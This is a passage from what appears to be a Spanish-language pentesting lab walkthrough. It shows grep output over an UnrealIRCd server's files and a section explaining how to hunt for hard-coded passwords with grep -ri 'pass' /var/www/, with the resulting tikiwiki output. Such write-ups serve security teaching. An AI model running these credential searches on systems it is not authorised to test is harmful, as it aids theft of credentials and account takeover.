/etc/unreal/doc/unreal32docs.html:    <td><div align="center">I &lt;nick!user@host&gt;<br></div></td>
/etc/unreal/doc/unreal32docs.html:    <td>Throttles joins per-user to <i>joins</i> per <i>seconds</i> seconds</td>
/etc/unreal/doc/unreal32docs.html:    <td>Sets max number of users</td>
/etc/unreal/doc/unreal32docs.html:    <td>If the amount set by +l has been reached, users will be sent to this channel</td>
/etc/unreal/doc/unreal32docs.html:    <td>Moderated channel. Only +v/o/h users may speak</td>
/etc/unreal/doc/unreal32docs.html:    <td>Gives a user channel operator status</td>
/etc/unreal/doc/unreal32docs.html:    <td>Only U:Lined servers can kick users</td>
/etc/unreal/doc/unreal32docs.html:    <td>Gives a voice to users. (May speak in +m channels)</td>
/etc/unreal/doc/unreal32docs.html:    <td colspan="2"><div align="center"><b>User Modes</b></div></td>
/etc/unreal/doc/unreal32docs.html:    <td>Allows you to only receive PRIVMSGs/NOTICEs from registered (+r) users</td>
/etc/unreal/doc/unreal32docs.html:    <td>Marks you as a WebTV user</td>
/etc/unreal/doc/unreal32docs.html:    <td>Gives user a hidden hostname </td>
/etc/unreal/doc/unreal32docs.html:<p><font size="+2"><b>7 &#8211; User & Oper Commands Table<a name="useropercommands" id="useropercommands"></a></b></font></p><div class="desc">
/etc/unreal/doc/unreal32docs.html:    <td>Displays information of user requested. Includes Full Name, Host, Channels 
/etc/unreal/doc/unreal32docs.html:      User is in, and Oper Status<br></td>
/etc/unreal/doc/unreal32docs.html:    <td>Who allows you to search for users. Masks 
/etc/unreal/doc/unreal32docs.html:    <td>Allows you to check the online status of a user, or a list of users. Simple 
/etc/unreal/doc/unreal32docs.html:    <td height="39">lusers &lt;server&gt; </td>
/etc/unreal/doc/unreal32docs.html:    <td>Displays current &amp; max user loads, both global and local. Adding a server name 
/etc/unreal/doc/unreal32docs.html:    <td height="39">ping &lt;user&gt;</td>
/etc/unreal/doc/unreal32docs.html:    <td>Sends a PING request to a user. Used for checking connection and lag. 
/etc/unreal/doc/unreal32docs.html:      Servers issue pings on a timed basis to determine if users are still connected.<br></td>
/etc/unreal/doc/unreal32docs.html:    <td>Sends a CTCP Version request to the user. If configured to do so, their 
/etc/unreal/doc/unreal32docs.html:    <td height="39">userhost &lt;nick&gt;</td>
/etc/unreal/doc/unreal32docs.html:    <td>Displays the userhost of the nick given. Generally used for scripts<br></td>
/etc/unreal/doc/unreal32docs.html:    <td>Invites the given user to the given channel. (Must be a channel Op)<br></td>
/etc/unreal/doc/unreal32docs.html:    <td height="39">kick &lt;channel, channel&gt; &lt;user, user&gt; &lt;reason&gt;</td>
/etc/unreal/doc/unreal32docs.html:    <td>Kicks a user or users out of a channel, or channels. A reason may also 
/etc/unreal/doc/unreal32docs.html:    <td>Allows users to change their &#8216;Real Name&#8217; without reconnecting<br></td>
/etc/unreal/doc/unreal32docs.html:    <td>Lets you set channel and user modes. See 
/etc/unreal/doc/unreal32docs.html:        <a href="#userchannelmodes">User &amp; Channel Modes</a> for a list.<br></td>
/etc/unreal/doc/unreal32docs.html:    <td height="39">userip &lt;nick&gt;<br></td>
/etc/unreal/doc/unreal32docs.html:    <td>Returns the IP address of the user in question.</td>
/etc/unreal/doc/unreal32docs.html:    <td height="39">oper &lt;userid&gt; &lt;password&gt;<br></td>
/etc/unreal/doc/unreal32docs.html:    <td>Command to give a user operator status if they match an Oper Block<br></td>
/etc/unreal/doc/unreal32docs.html:    <td>Sends a message to all users with umode +w</td>
/etc/unreal/doc/unreal32docs.html:    <td>Kills a user from the network</td>
/etc/unreal/doc/unreal32docs.html:    <td height="39">kline [+|-]&lt;user@host | nick&gt; [&lt;time to ban&gt; &lt;reason&gt;]</td>
/etc/unreal/doc/unreal32docs.html:        To remove a kline use /kline -user@host</td>
/etc/unreal/doc/unreal32docs.html:    <td height="39">gline [+|-]&lt;user@host | nick&gt; [&lt;time to ban&gt; &lt;reason&gt;]<br></td>
/etc/unreal/doc/unreal32docs.html:      Use /gline -user@host to remove.<br></td>
/etc/unreal/doc/unreal32docs.html:    <td height="39">shun [+|-]&lt;user@host | nick&gt; [&lt;time to shun&gt; &lt;reason&gt;]<br></td>
/etc/unreal/doc/unreal32docs.html:    <td>Prevents a user from executing ANY commands and prevents them from speaking. 
/etc/unreal/doc/unreal32docs.html:      Use /shun -user@host to remove a shun.
/etc/unreal/doc/unreal32docs.html:    <td>Lets you change the host name of a user currently on the system<br></td>
/etc/unreal/doc/unreal32docs.html:    <td>Lets you change the ident of a user currently on the system<br></td>
/etc/unreal/doc/unreal32docs.html:    <td>Lets you change the realname of a user currently on the system<br></td>
/etc/unreal/doc/unreal32docs.html:    <td>Forces a user to join a channel(s). Available to services & network 
/etc/unreal/doc/unreal32docs.html:    <td>Forces a user to part a channel(s). Available to services & network 
/etc/unreal/doc/unreal32docs.html:    <td>When used on a user it will give you class and lag info. If you use
/etc/unreal/doc/unreal32docs.html:      basically disables certain user commands such as: list whois who etc in 
/etc/unreal/doc/unreal32docs.html:      -NOISY Sets the server to notify users/admins when in goes in and out of HTM<br>
/etc/unreal/doc/unreal32docs.html:      K - kline - Send the ban user/ban ip/except ban block list<br>
/etc/unreal/doc/unreal32docs.html:Also, if you are on a multi-user box (eg: you bought a shell) there's the risk of local exploits and bad permissions 
/etc/unreal/doc/unreal32docs.html:(group/)other shouldn't have read permissions. Otherwise a local user can simply grab 
/etc/unreal/doc/unreal32docs.html:<p><b><font size="+2">8.4 User-related problems</font></b><a name="secuser"></a><br><div class="desc">
/etc/unreal/doc/unreal32docs.html:as possible. A question you should ask yourself is "what do I want my users to see?". 
/etc/unreal/doc/unreal32docs.html:Hiding servers that are actually used by users is useless since they already know 
/etc/unreal/doc/unreal32docs.html:don't want users on, see section 8.6.<br>
/etc/unreal/doc/unreal32docs.html:this will make all servers appear as 'directly linked' in /map and /links, thus normal users 
/etc/unreal/doc/unreal32docs.html:<b>NORMAL USERS &amp; SNOMASKS</b><br>
/etc/unreal/doc/unreal32docs.html:A feature that isn't widely known is that normal users can also set some limited snomasks, 
/etc/unreal/doc/unreal32docs.html:To disable this you can use set::restrict-usermodes like this: <i>set { restrict-usermodes "s"; };</i>.<br>
/etc/unreal/doc/unreal32docs.html:the user is confined to the UnrealIRCd directory and cannot touch any other
/etc/unreal/doc/unreal32docs.html:(search for CHROOTDIR, and also set IRC_USER and IRC_GROUP), and a
/etc/unreal/doc/unreal32docs.html:<div class="desc">Back references allow you to reference the string that matched one of the subexpressions of the regexp. You use a back reference by specifying a backslash (\) followed by a number, 0-9, for example \1. \0 is a special back reference that refers to the entire regexp, rather than a subexpression. Back references are useful when you want to match something that contains the same string twice. For example, say you have a nick!user@host. You know that there is a trojan that uses a nickname and username that matches "[0-9][a-z]{5}", and both the nickname and username are the same. Using "[0-9][a-z]{5}![0-9][a-z]{5}@.+" will not work because it would allow the nickname and username to be different. For example, the nickname could be 1abcde and the username 2fghij. Back references allow you to overcome this limitation. Using, "([0-9][a-z]{5})!\1@.+" will work exactly as expected. This searches for the nickname matching the given subexpressions, then it uses a back reference to say that the username must be the same text. 
/etc/unreal/doc/tao.of.irc:great then the client will always be the server. The luser is then pleased
/etc/unreal/doc/tao.of.irc:Some time later there was a quantity of some lusers who wanted to be
/etc/unreal/doc/tao.of.irc:Lusers that do not understand the Tao is always using the yang of Mode on
/etc/unreal/doc/tao.of.irc:their channels. Lusers that do understand the Tao are always using Ignore
/etc/unreal/doc/tao.of.irc:The wise sage luser is told about the Chat and uses it. The luser is told
/etc/unreal/doc/tao.of.irc:The sage luser must be aware like a frog crossing the highway.
/etc/unreal/doc/tao.of.irc:        "The lusers shall keep in mind that a automata can be either good or
/etc/unreal/doc/tao.of.irc:Many lusers have fallen into the clutches of ethernal damnation. They where
/etc/unreal/doc/tao.of.irc:There once was a luser who went to #BotSex. Each day he saw the automatons.
/etc/unreal/doc/tao.of.irc:The luser decided that he also would have such a automata.
/etc/unreal/doc/tao.of.irc:He asked another luser for his automata. The other luser gave his automata
/etc/unreal/doc/tao.of.irc:The luser was not within the Tao, so he just started the automata. The automata
/etc/unreal/doc/tao.of.irc:had only Yang inside so all the lusers files where deleted.
/etc/unreal/doc/tao.of.irc:Some moons laither the same luser then had become a sage luser, and did create
/etc/unreal/doc/tao.of.irc:The luser was now within the Tao and his automata lived happily ever after.
/etc/unreal/doc/tao.of.irc:A novice luser, seeking to imitate him, began with the help of master Phone.
/etc/unreal/doc/tao.of.irc:When the novice luser asked the master to evaluate his automata the master
/etc/unreal/doc/tao.of.irc:replied: "What is a working automata for the master is not for the luser.
/etc/unreal/doc/tao.of.irc:The sage luser came to the master who wrote automata without the help of
/etc/unreal/doc/tao.of.irc:master Phone. The sage luser asked the master who wrote automata: "Which is
/etc/unreal/doc/tao.of.irc:The sage luser was disapointed and exclaimed: "But, with master Phone you
/etc/unreal/doc/tao.of.irc:you are closed inside a box. For sure, it is a great box for the lusers,
/etc/unreal/doc/tao.of.irc:"I see", said the sage luser.
/etc/unreal/doc/tao.of.irc:client is that it should be very convinient for the luser to use, but hard
/etc/unreal/doc/tao.of.irc:for the luser who want to create automata.
/etc/unreal/doc/tao.of.irc:The client should always respond the luser with messages that will not
/etc/unreal/doc/tao.of.irc:A client which fails this, will be useless and cause confusion for the lusers.
/etc/unreal/doc/tao.of.irc:A luser asked the masters on #IrcHelp: "My client does not work".
/etc/unreal/doc/tao.of.irc:The luser then wondered why the master knew. The master then told him about
/etc/unreal/doc/tao.of.irc:The luser came to the masters of #IrcHelp, asking about the Tao of IRC within
/etc/unreal/doc/tao.of.irc:"Is the Tao in irc ?" asked the luser.
/etc/unreal/doc/tao.of.irc:luser.
/etc/unreal/doc/tao.of.irc:There once was a luser who used the ircII client. "ircII can do anything I
/etc/unreal/doc/tao.of.irc:ever need for using IRC" said the emacs client user, "I have /ON's, I have
/etc/unreal/doc/tao.of.irc:The emacs client user then replied by saying that "it is better to have a
/etc/unreal/doc/tao.of.irc:a scripting language." Upon hearing this, the ircII client luser fell silent.
/etc/unreal/doc/tao.of.irc:A luser came unto the masters of #EU-Opers and asked, "How can I be, yet not
/etc/unreal/doc/tao.of.irc:be, a user@host within the IRC?"
Binary file /etc/unreal/tmp/219364B4.cloak.so matches
Binary file /etc/unreal/tmp/2CE3F887.commands.so matches
/etc/unreal/help.conf:  " /HELPOP USERCMDS - To get the list of User Commands";
/etc/unreal/help.conf:  " /HELPOP UMODES   - To get the list of User Modes";
/etc/unreal/help.conf:help Usercmds {
/etc/unreal/help.conf:  " Currently the following User commands are available.";
/etc/unreal/help.conf:  " ADMIN           LICENSE         PART            USERHOST";
/etc/unreal/help.conf:  " AWAY            LINKS           PING            USERIP";
/etc/unreal/help.conf:  " CYCLE           LUSERS          PRIVMSG         VHOST";
/etc/unreal/help.conf:  " SVS2MODE        SVSLUSERS       SVSNOLAG    SVSSNO";
/etc/unreal/help.conf:  " Here is a list of all the usermodes which are available for use.";
/etc/unreal/help.conf:  " x = Gives the user Hidden Hostname (security)";
/etc/unreal/help.conf:  " R = Allows you to only receive PRIVMSGs/NOTICEs from registered (+r) users";
/etc/unreal/help.conf:  " V = Marks the client as a WebTV user";
/etc/unreal/help.conf:  " v <nickname> = Gives Voice to the user (May talk if chan is +m)";
/etc/unreal/help.conf:  " h <nickname> = Gives HalfOp status to the user (Limited op access)";
/etc/unreal/help.conf:  " o <nickname> = Gives Operator status to the user";
/etc/unreal/help.conf:  " a <nickname> = Gives Channel Admin to the user";
/etc/unreal/help.conf:  " q <nickname> = Gives Owner status to the user";
/etc/unreal/help.conf:  " e <nick!ident@host> = Overrides a ban for matching users [h]";
/etc/unreal/help.conf:  " I <nick!ident@host> = Overrides +i for matching users [h]";
/etc/unreal/help.conf:  " i = A user must be invited to join the channel [h]";
/etc/unreal/help.conf:  " j <joins:sec> = Throttle joins per-user to 'joins' per 'sec' seconds [o]";
/etc/unreal/help.conf:  " k <key> = Users must specify <key> to join [h]";
/etc/unreal/help.conf:  " l <number of max users> = Channel may hold at most <number> of users [o]";
/etc/unreal/help.conf:  " m = Moderated channel (only +vhoaq users may speak) [h]";
/etc/unreal/help.conf:  " n = Users outside the channel can not send PRIVMSGs to the channel [h]";
/etc/unreal/help.conf:  " L <chan2> = Channel link (If +l is full, the next user will auto-join <chan2>) [q]";
/etc/unreal/help.conf:  " R = Only registered (+r) users may join the channel [o]";
/etc/unreal/help.conf:  "         |               | If the user is in this channel then (s)he is unable to  ";
/etc/unreal/help.conf:  "    ~c   |    channel    | means that it will only match if the user has that      ";
/etc/unreal/help.conf:  "         |               | If the realname of a user matches this then (s)he is    ";
/etc/unreal/help.conf:  " channel whereas t is tallied per user.";
/etc/unreal/help.conf:  " b (can_kline)        Oper can /KLINE users from server";
/etc/unreal/help.conf:  " Shows information about the user in question,";
/etc/unreal/help.conf:  " Syntax:  WHOIS <user>";
/etc/unreal/help.conf:  " ~ - User is a Channel Owner (+q)";
/etc/unreal/help.conf:  " & - User is a Channel Admin (+a)";
/etc/unreal/help.conf:  " @ - User is a Channel Operator (+o)";
/etc/unreal/help.conf:  " % - User is a Halfop (+h)";
/etc/unreal/help.conf:  " + - User is Voiced (+v)";
/etc/unreal/help.conf:  " ! - User has channels hidden in whois (+p) and you are an IRC Operator";
/etc/unreal/help.conf:  " Retrieves information about users";
/etc/unreal/help.conf:  " Flag a: user is away";
/etc/unreal/help.conf:  " Flag c <channel>: user is on <channel>, no wildcards accepted";
/etc/unreal/help.conf:  " Flag g <gcos/realname>: user has string <gcos> in his/her GCOS,";
/etc/unreal/help.conf:  " Flag h <host>: user has string <host> in his/her hostname, wildcards are accepted";
/etc/unreal/help.conf:  " Flag i <ip>: user has string <ip> in his/her IP address";
/etc/unreal/help.conf:  " Flag m <usermodes>: user has <usermodes> set, only o/C/A/a/N for nonopers";
/etc/unreal/help.conf:  " Flag n <nick>: user has string <nick> in his/her nickname, wildcards accepted";
/etc/unreal/help.conf:  " Flag s <server>: user is on server <server>, wildcards not accepted";
/etc/unreal/help.conf:  " Flag u <user>: user has string <user> in his/her username, wildcards accepted";
/etc/unreal/help.conf:  " Flag M: check for user in channels I am a member of";
/etc/unreal/help.conf:  " Flag R: show users' real hostnames";
/etc/unreal/help.conf:  " Flag I: show users' IP addresses";
/etc/unreal/help.conf:  " For backwards compatibility, /who 0 o still shows +o users";
/etc/unreal/help.conf:  " different information about the user. These flags are explained below:";
/etc/unreal/help.conf:  " G - User is /away (gone)";
/etc/unreal/help.conf:  " H - User is not /away (here)";
/etc/unreal/help.conf:  " r - User is using a registered nickname";
/etc/unreal/help.conf:  " B - User is a bot (+B)";
/etc/unreal/help.conf:  " * - User is an IRC Operator";
/etc/unreal/help.conf:  " ~ - User is a Channel Owner (+q)";
/etc/unreal/help.conf:  " & - User is a Channel Admin (+a)";
/etc/unreal/help.conf:  " @ - User is a Channel Operator (+o)";
/etc/unreal/help.conf:  " % - User is a Halfop (+h)";
/etc/unreal/help.conf:  " + - User is Voiced (+v)";
/etc/unreal/help.conf:  " ! - User is +H and you are an IRC Operator";
/etc/unreal/help.conf:  " ? - User is only visible because you are an IRC Operator";
/etc/unreal/help.conf:  " Retrieves previous WHOIS information for users";
/etc/unreal/help.conf:  " Provides a list of users on the specified channel.";
/etc/unreal/help.conf:  " Used to determine if certain user(s) are";
/etc/unreal/help.conf:  " Syntax:  ISON <user> <user2> <user3> <user4>";
/etc/unreal/help.conf:  " If you specify a reason it will be displayed to the users on the channel";
/etc/unreal/help.conf:help Lusers {
/etc/unreal/help.conf:  " Provides Local and Global user information";
/etc/unreal/help.conf:  " (Such as Current and Maximum user count).";
/etc/unreal/help.conf:  " Syntax: LUSERS [server]";
/etc/unreal/help.conf:help Userhost {
/etc/unreal/help.conf:  " Returns the userhost of the user in question.";
/etc/unreal/help.conf:  " Syntax:  USERHOST <nickname>";
/etc/unreal/help.conf:  " Example: USERHOST hAtbLaDe";
/etc/unreal/help.conf:help Userip {
/etc/unreal/help.conf:  " Returns the userip of the user in question.";
/etc/unreal/help.conf:  " Syntax: USERIP <nickname>";
/etc/unreal/help.conf:  " Example: USERIP codemastr";
/etc/unreal/help.conf:  " Sends a user an Invitation to join a particular channel.";
/etc/unreal/help.conf:  " command, otherwise any user may use the command.";
/etc/unreal/help.conf:  " Syntax:  INVITE [<user> <channel>]";
/etc/unreal/help.conf:  " Removes a user from a channel. Can only be used by Operators";
/etc/unreal/help.conf:  " Syntax:  KICK <channel> <user> [reason]";
/etc/unreal/help.conf:  "         WATCH (View which users are online)";
/etc/unreal/help.conf:  " Send a message to a user, channel or server.";
/etc/unreal/help.conf:  "  Send a message to users with <prefix> and higher in <#channel> only";
/etc/unreal/help.conf:  "  Send a message to all users on servers matching <mask> [Oper only]";
/etc/unreal/help.conf:  " Send a notice to a user, channel or server.";
/etc/unreal/help.conf:  "  Send a notice to a user.";
/etc/unreal/help.conf:  "  Send a notice to users with <prefix> and higher in <#channel> only";
/etc/unreal/help.conf:  "  Send a notice to all users on servers matching <mask> [Oper only]";
/etc/unreal/help.conf:  " Allows users to change their \"Real name\" (GECOS)";
/etc/unreal/help.conf:  " Sets a mode on a Channel or User.";
/etc/unreal/help.conf:  " Syntax:  MODE <channel/user> <mode>";
/etc/unreal/help.conf:  " Ignores messages from a user or list of users at the Server itself.";
/etc/unreal/help.conf:  " Attempts to give a user IRC Operator status.";
/etc/unreal/help.conf:  " (unlike WALLOPS, which can be viewed by normal users).";
/etc/unreal/help.conf:  " Example: LOCOPS Gonna k:line that user ...";
/etc/unreal/help.conf:  " Example: CHATOPS Gonna k:line that user ...";
/etc/unreal/help.conf:  " Forcefully Disconnects users from an IRC Server.";
/etc/unreal/help.conf:  " Syntax:  KILL <user1>,<user2>,<user3>,... <reason>";
/etc/unreal/help.conf:  " Syntax:  GLINE <user@host mask or nick> [time] <reason>";
/etc/unreal/help.conf:  "  (Adds a G:line for user@host)";
/etc/unreal/help.conf:  "          GLINE -<user@host mask> (Removes a G:line for user@host)";
/etc/unreal/help.conf:  " Prevents a user from executing ANY command except ADMIN";
/etc/unreal/help.conf:  "          SHUN +<user@host> <time> :<Reason>(Shun the user@host for time in seconds)";
/etc/unreal/help.conf:  "          SHUN -<user@host> (Removes the SHUN for user@host)";
/etc/unreal/help.conf:  " any user from that hostmask from connecting to the network.";
/etc/unreal/help.conf:  " Syntax:  AKILL <user@host> :<Reason>";
/etc/unreal/help.conf:  " Syntax: RAKILL <user@host>";
/etc/unreal/help.conf:  " Kills and Restarts the IRC daemon, disconnecting all users";
/etc/unreal/help.conf:  " Kills the IRC daemon, disconnecting all users currently on that server.";
/etc/unreal/help.conf:  " With this command you can change your Ident (Username).";
/etc/unreal/help.conf:  " Changes the hostname of a user currently on the IRC network.";
/etc/unreal/help.conf:  " Changes the Ident of a user currently on the IRC network.";
/etc/unreal/help.conf:  " Changes the \"IRC Name\" (or \"Real Name\") of a user currently on the IRC network.";
/etc/unreal/help.conf:  " Forces a user to join a channel.";
/etc/unreal/help.conf:  " Forces a user to part a channel.";
/etc/unreal/help.conf:  " You can use TRACE on servers or users.";
/etc/unreal/help.conf:  " When used on a user it will give you class and lag info.";
/etc/unreal/help.conf:  " Depending on whether you are a normal user or an oper";
/etc/unreal/help.conf:  " -- normal user: --";
/etc/unreal/help.conf:  " Changes the nickname of the user in question.";
/etc/unreal/help.conf:  " Changes the mode of the User in question.";
/etc/unreal/help.conf:  " Syntax:  SVSMODE <nickname> <usermode>";
/etc/unreal/help.conf:  " Forcefully disconnects a user from the network.";
/etc/unreal/help.conf:  " Syntax:  SVSKILL <user> :<reason>";
/etc/unreal/help.conf:  " Forces a user to join a channel.";
/etc/unreal/help.conf:  " Forces a user to leave a channel.";
/etc/unreal/help.conf:  " Changes the Usermode of a nickname and displays";
/etc/unreal/help.conf:  " the change to the user.";
/etc/unreal/help.conf:  " Syntax:  SVS2MODE <nickname> <usermodes>";
/etc/unreal/help.conf:help Svslusers {
/etc/unreal/help.conf:  " Changes the global and/or local maximum user count";
/etc/unreal/help.conf:  " Syntax:  SVSLUSERS <server> <globalmax|-1> <localmax|-1>";
/etc/unreal/help.conf:  " Example: SVSLUSERS irc.test.com -1 200";
/etc/unreal/help.conf:  " Changes the WATCH list of a user.";
/etc/unreal/help.conf:  " Changes the SILENCE list of a user.";
/etc/unreal/help.conf:  " Changes the snomask of the User in question.";
/etc/unreal/help.conf:  " the change to the user.";
/etc/unreal/help.conf:        " Enable 'no fake lag' for a user.";
/etc/unreal/help.conf:        " Enable 'no fake lag' for a user.";
/etc/unreal/help.conf:  "           'a' away, 't' topic, 'u' user (nick!user@host:realname ban)";
/etc/unreal/help.conf:  " _the current session only_, this means if the user reconnects";
/etc/unreal/badwords.channel.conf: NOTE: Those words are not meant to insult you (the user)
/etc/unreal/badwords.channel.conf:       but is meant to be a list of words so that the +G channel/user mode 
/etc/unreal/spamfilter.conf:    reason "Spamming users with an mIRC trojan. Type '/unload -rs newb' to remove the trojan.";
/etc/group:users:x:100:
/etc/group:user:x:1001:
/etc/bash_completion.d/quilt:   # expand ~username type directory specifications
/etc/bash_completion.d/quilt:#  user can go in them. It ought to be a more standard way to achieve this.

Para filtrar esta información, utilizamos el comando:

```bash
grep -i 'user' users.txt
```

#### 🔍 Bloque 3 – Directorios de aplicaciones web y bases de datos

Aplicaciones suelen guardar credenciales en configuraciones web o scripts.

##### 5. Buscar en /var/www/ posibles credenciales:

Este comando es especialmente interesante porque /var/www/ suele contener archivos web, y buscar la palabra 'pass' ahí puede revelar contraseñas duras codificadas, formularios, configuraciones sensibles, etc.

```bash
grep -ri 'pass' /var/www/ 2>/dev/null
```

Esto buscará cualquier coincidencia con 'pass' (como password, passwd, pass123, etc.) en los archivos web del servidor.

###### ¿Por qué es útil?

- Puedes encontrar contraseñas en archivos **.php**, **.html**, **.conf**, etc.
- A veces los desarrolladores dejan credenciales en archivos de prueba o configuración.
- Ideal para auditorías web o pentesting.

Para filtrar la información más relevante debido a los altos volúmenes de información que obtenemos con estos comandos utilizamos:

```bash
grep -i 'pass' www_pass.txt
```

Salida en consola:

/var/www/tikiwiki/lang/fr/language.php:"Invalid old password" => "Ancien mot de passe invalide",
/var/www/tikiwiki/lang/fr/language.php:"Password should be at least" => "Le mot de passe doit être au moins",
/var/www/tikiwiki/lang/fr/language.php:"Password must contain both letters and numbers" => "Le mot de passe doit contenir des lettres et des chiffres",
/var/www/tikiwiki/lang/fr/language.php:"Invalid username or password" => "Nom d'utilisateur ou mot de passe invalide",
/var/www/tikiwiki/lang/fr/language.php:"Wrong password. Cannot post comment" => "Mot de passe incorrect. Vous ne pouvez pas publier un commentaire",
/var/www/tikiwiki/lang/fr/language.php:"Missing information to read news (server,port,username,password,group) required" => "Informations manquantes pour lire les news (serveur, port, nom utilisateur, mot de passe, groupe) exigées",
/var/www/tikiwiki/lang/fr/language.php:"Password is required" => "Mot de passe obligatoire",
/var/www/tikiwiki/lang/fr/language.php:"The passwords don't match" => "Les mots de passe ne correspondent pas",
/var/www/tikiwiki/lang/fr/language.php:"The passwords dont match" => "Les mots de passe ne correspondent pas",
/var/www/tikiwiki/lang/fr/language.php:"password" => "mot de passe",
/var/www/tikiwiki/lang/fr/language.php:"Wrong passcode you need to know the passcode to register in this site" => "Passcode invalide : vous devez connaître le passcode pour vous inscrire dans ce site",
/var/www/tikiwiki/lang/fr/language.php:"Upload was not successful" => "Le téléchargement s'est mal passé",
/var/www/tikiwiki/lang/fr/language.php:"Cannot upload this file maximum upload size exceeded" => "Ne peut pas télécharger le fichier - taille maximale dépassée",
/var/www/tikiwiki/lang/fr/language.php:"Quiz time limit exceeded quiz cannot be computed" => "Limite de temps dépassée : le QCM ne peut pas être traité",
/var/www/tikiwiki/lang/fr/language.php:"requested a reminder of the password for your account" => "a demandé de vous renvoyer votre mot de passe pour votre compte",
/var/www/tikiwiki/lang/fr/language.php:"requested password reset for your account" => "a demandé un nouveau mot de passe pour votre compte",
/var/www/tikiwiki/lang/fr/language.php:"Since this is your registered email address we inform that the password for this account is" => "Comme ceci est l'adresse électronique de votre inscription, nous vous informons que le mot de passe pour ce compte est",
/var/www/tikiwiki/lang/fr/language.php:"Please click on the following link to confirm you wish to reset your password and go to the screen where you must enter a new \"permanent\" password. Please pick a password only you will know, and don't share it with anyone else.\n{\$mail_machine}/tiki-remind_password.php?user={\$mail_user|escape:'url'}&actpass={\$mail_apass}\n\nDone! You should be logged in." => "SVP, suivez ce lien pour confirmer que vous désirez réinitialiser votre mot de passe. Sur cette page, vous devez saisir un nouveau mot de passe \"permanent\" . SVP, choisissez un mot de passe connu de vous seul et ne le partager pas.\n{\$mail_machine}/tiki-remind_password.php?user={\$mail_user|escape:'url'}&actpass={\$mail_apass}\n\nOk! Vous devez être connecté maintenant.",
/var/www/tikiwiki/lang/fr/language.php:"Important: Username & password are CaSe SenSitiVe" => "Important : Nom d'utilisateur et mot de passe tiennent compte de la casse (lettre minuscules vs MAJUSCULES)",
/var/www/tikiwiki/lang/fr/language.php:"Important: The old password remains active if you don't click the link above." => "Important: Le vieux mot de passe reste actif tant que vous ne cliquez pas sur le lien au-dessus",
/var/www/tikiwiki/lang/fr/language.php:"To login with your username and password, please follow this link:" => "Pour vous connecter avec votre nom d'utilisateur et votre mot de passe, suivez SVP le lien :",
/var/www/tikiwiki/lang/fr/language.php:"I forgot my password" => "J'ai oublié mon mot de passe",
/var/www/tikiwiki/lang/fr/language.php:"send me my password" => "envoyez-moi mon mot de passe",
/var/www/tikiwiki/lang/fr/language.php:"Passcode to register (not your user password)" => "Passcode pour s'inscrire (pas votre mot de passe d'utilisateur)",
/var/www/tikiwiki/lang/fr/language.php:"Password" => "Mot de passe",
/var/www/tikiwiki/lang/fr/language.php:"Repeat password" => "Encore",
/var/www/tikiwiki/lang/fr/language.php:"Generate a password" => "Générer un mot de passe",
/var/www/tikiwiki/lang/fr/language.php:"pass" => "mot de passe",
/var/www/tikiwiki/lang/fr/language.php:"Click here if you've forgotten your password" => "Cliquer ici si vous avez oublié votre mot de passe",
/var/www/tikiwiki/lang/fr/language.php:"I forgot my pass" => "J'ai oublié mon mot de passe",
/var/www/tikiwiki/lang/fr/language.php:"Site logo title (on mouse over)" => "Titre du logo du site logo (quand la souris passe dessus)",
/var/www/tikiwiki/lang/fr/language.php:"Old vers" => "Versions passées",
/var/www/tikiwiki/lang/fr/language.php:"Request passcode to register" => "Exiger un passcode pour s'inscrire",
/var/www/tikiwiki/lang/fr/language.php:"Remind passwords by email (if \"Store plaintext passwords\" is activated.) Else, Reset passwords by email" => "Rappel de mot de passe par email (si \"Sauvegarder les mots de passe en texte plein\" est activé.) Sinon, Réinitialisation de votre mot de passe par email",
/var/www/tikiwiki/lang/fr/language.php:"Store plaintext passwords" => "Sauvegarder les mots de passe en texte plein",
/var/www/tikiwiki/lang/fr/language.php:"Reg users can change password" => "Les utilisateurs inscrits peuvent changer de mot de passe",
/var/www/tikiwiki/lang/fr/language.php:"Force to use chars and nums in passwords" => "Obliger d'utiliser caractères et numériques dans un mot de passe",
/var/www/tikiwiki/lang/fr/language.php:"Minimum password length" => "Longueur minimum d'un mot de passe",
/var/www/tikiwiki/lang/fr/language.php:"Password invalid after days" => "Mot de passe invalide après (en jours)",
/var/www/tikiwiki/lang/fr/language.php:"LDAP Admin Pwd" => "Administrer les mots de passe LDAP",
/var/www/tikiwiki/lang/fr/language.php:"Allow students to retake this quiz " => "Permettre aux étudiants de repasser ce QCM",
/var/www/tikiwiki/lang/fr/language.php:"Show user's info on mouseover" => "Montrer ses info. utilisateur au passage de la souris",
/var/www/tikiwiki/lang/fr/language.php:"Leave \"New password\" and \"Confirm new password\" fields blank to keep current password" => "Laisser les champs \"Nouveau mot de passe\" et \"Confirmer le nouveau mot de passe\" à blanc pour garder le mot de passe courant",
/var/www/tikiwiki/lang/fr/language.php:"New password" => "Nouveau mot de passe",
/var/www/tikiwiki/lang/fr/language.php:"Confirm new password" => "Confirmer le nouveau mot de passe",
/var/www/tikiwiki/lang/fr/language.php:"Current password (required)" => "Mot de passe courant (obligatoire)",
/var/www/tikiwiki/lang/fr/language.php:"Passing Percentage" => "Pourcentage d'accomplissement",
/var/www/tikiwiki/lang/fr/language.php:"Displays preformated text/code; no Wiki processing is done inside these sections (as with np), and the spacing is fixed (no word wrapping is done)." => "Affiche du texte/code préformatté; aucune transformation Wiki ne sera faite dans ces sections (comme avec np), et l'espacement est fixe (aucune césure/passage à la ligne n'est fait)",
/var/www/tikiwiki/lang/fr/language.php:"Change password enforced" => "Changement de mot de passe imposé",
/var/www/tikiwiki/lang/fr/language.php:"Old password" => "Ancien mot de passe",
/var/www/tikiwiki/lang/fr/language.php:"Password protected" => "Protéger par un mot de passe",
/var/www/tikiwiki/lang/fr/language.php:"Forum password" => "Mot de passe du forum",
/var/www/tikiwiki/lang/fr/language.php:"Warning: changing the username will require the user to change his password and will mess with slave intertiki sites that use this one as master" => "Attention : changer le nom utilisateur va demander de changer le mot de passe et va créer des problèmes avec les sites esclaves InterTiki qui utilisent ce site comme maître",
/var/www/tikiwiki/lang/fr/language.php:"Warning: changing the username will require the user to change his password" => "Attention: changer le nom de l'utilisateur va lui demander de changer son mot de passe",
/var/www/tikiwiki/lang/fr/language.php:"Pass" => "Mot de passe ",
